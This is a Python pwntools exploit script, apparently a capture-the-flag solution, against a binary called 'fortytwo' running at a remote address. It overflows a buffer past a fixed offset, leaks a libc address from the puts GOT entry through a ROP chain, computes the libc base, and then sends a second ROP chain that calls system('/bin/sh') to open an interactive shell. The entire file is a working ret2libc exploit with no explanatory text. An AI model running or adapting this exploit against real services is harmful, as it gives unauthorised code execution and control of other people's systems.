#!/usr/bin/env python3

from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64

LOCAL_BIN = "./fortytwo"
#LOCAL_LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
LOCAL_LIBC = "./libc.so.6"
LOCAL = False
GDB = False

LIBC = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
BIN = ELF(LOCAL_BIN)
ENV = {"LD_PRELOAD": LOCAL_LIBC} if LIBC else {}

if LOCAL:
    P = process(LOCAL_BIN, env=ENV)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)
    if GDB:
        gdb.attach(P.pid, """
b *(main+285)
display/i $pc
c
""")
else:
    P = remote('10.10.8.11',36255)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

rip_offset = 35
answer = b"42 "
PREFIX = answer+b"F"*rip_offset

libc_func = "puts"
PUTS_PLT = ELF_LOADED.plt['puts']
MAIN_PLT = ELF_LOADED.symbols['main']
FUNC_GOT = ELF_LOADED.got[libc_func]
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]
RET = (ROP_LOADED.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
log.info("ret gadget: " + hex(RET))

def generate_payload_aligned(rop):
    payload1 = rop
    if (len(payload1) % 16) == 0:
        return payload1
    else:
        payload2 = p64(RET) + rop
        if (len(payload2) % 16) == 0:
            log.info("Payload aligned successfully")
            return payload2
        else:
            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
            return payload1

# Leak offset
log.info(libc_func + " GOT @ " + hex(FUNC_GOT))
payload_leak = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
payload_leak = PREFIX + generate_payload_aligned(payload_leak)

print(P.clean())
P.sendline(answer)
print(P.clean())
P.sendline(answer)
print(P.clean())
P.sendline(payload_leak)
print(P.clean())
P.sendline(answer)
received = P.recvline().strip()
leak = u64(received.ljust(8, b"\x00"))
log.info(f"Leaked LIBC address,  {libc_func}: {hex(leak)}")
LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
log.info("If LIBC base doesn't end end 00, you might be using an icorrect libc library")
log.info("LIBC base @ %s" % hex(LIBC.address))

#Exploit
BINSH = next(LIBC.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = LIBC.sym["system"]
    
log.info("POP_RDI %s " % hex(POP_RDI))
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
    
payload = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #+ p64(EXIT)
payload = PREFIX + generate_payload_aligned(payload)
    
print(P.clean())
P.sendline(answer)
print(P.clean())
P.sendline(answer)
print(P.clean())
P.sendline(payload)
print(P.clean())
P.sendline(answer)
P.interactive()
